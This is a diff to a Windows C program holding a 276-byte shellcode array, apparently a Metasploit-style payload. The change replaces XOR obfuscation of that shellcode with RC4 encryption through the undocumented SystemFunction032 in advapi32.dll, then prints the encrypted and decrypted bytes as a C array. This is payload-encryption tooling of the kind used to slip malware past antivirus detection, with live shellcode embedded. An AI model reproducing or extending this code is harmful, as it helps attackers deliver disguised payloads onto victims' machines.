@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 
+
 unsigned char shellcode[276] = {
 	0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
 	0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
@@ -28,14 +29,39 @@ unsigned char shellcode[276] = {
 	0x00
 };
 
-VOID XorByInputKey(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize) {
-    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
-        if (j > sKeySize) {
-            j = 0;
-        }
-        pShellcode[i] = pShellcode[i] ^ bKey[j];
-    }
+typedef struct _USTRING
+{
+	DWORD	Length;
+	DWORD	MaximumLength;
+	PVOID	Buffer;
+
+} USTRING, *PUSTRING;
+
+
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+	PUSTRING Data,
+	PUSTRING Key
+	);
+
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	NTSTATUS	STATUS = 0;
+
+	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
+		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
+
+
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
+
+	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
+		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
 }
+
 
 
 unsigned char key[] = {
@@ -43,14 +69,14 @@ unsigned char key[] = {
 };
 
 void printShellcode() {
-	// Affichage hexad cimal de la version xor e mais avec le format bytes array en C
+	// Print shellcode as a C byte array
 	printf("byte shellcode[%zu] = {\n    ", sizeof(shellcode));
 	for (size_t i = 0; i < sizeof(shellcode); i++) {
 		printf("0x%02x", (unsigned char)shellcode[i]);
 		if (i != sizeof(shellcode) - 1) {
 			printf(", ");
 		}
-		// Retour   la ligne tous les 16 octets pour la lisibilit 
+		// Break line every 16 bytes for readability
 		if ((i + 1) % 16 == 0 && i != sizeof(shellcode) - 1) {
 			printf("\n    ");
 		}
@@ -65,20 +91,20 @@ int main() {
 	
 
 	// Encryption
-	XorByInputKey(shellcode, sizeof(shellcode), (PBYTE)"clef", 4);
+	if (!Rc4EncryptionViSystemFunc032(key, shellcode, sizeof(key), sizeof(shellcode))) {
+		// Failed
+		return -1;
+	}
 
 	printShellcode();
 
 	// Decryption
-	XorByInputKey(shellcode, sizeof(shellcode), (PBYTE)"clef", 4);
-
+	if (!Rc4EncryptionViSystemFunc032(key, shellcode, sizeof(key), sizeof(shellcode))) {
+		// Failed
+		return -1;
+	}
 	printShellcode();
 
 	return 0;
 
 }
-
-/*for (size_t i = 0; i < sizeof(shellcode); i++) {
-	printf("%02x ", (unsigned char)shellcode[i]);
-}
-printf("\n");*/
